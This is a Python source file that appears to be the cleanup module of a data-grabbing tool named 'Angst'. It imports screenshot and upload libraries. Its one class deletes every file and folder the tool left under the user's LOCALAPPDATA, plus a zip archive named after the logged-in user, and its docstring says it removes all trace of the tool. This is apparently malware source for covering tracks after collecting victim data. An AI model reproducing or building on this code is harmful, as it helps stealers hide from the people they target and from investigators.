import os
import mss.tools
import requests
import zipfile
import threading

class CleanUp():

    def __init__(self):
        self.app_data = os.getenv("LOCALAPPDATA")
	    
        self.cleanup()

    def cleanup(self):
            """
            Removes all trace
            of angst by deleting
            log files left by
            angst.
            """
            angst_dir = os.path.join(self.app_data, "Angst")
            for subdir, dirs, files in os.walk(angst_dir):
                for file in files:
                    filepath = f"{subdir}{os.sep}{file}"
                    os.remove(filepath)

            for subdir, dirs, files in os.walk(angst_dir):
                for d in dirs:
                    os.rmdir(f"{subdir}\\{d}")
            os.rmdir(angst_dir)
            os.remove(os.path.join(self.app_data, f'Angst-[{os.getlogin()}].zip'))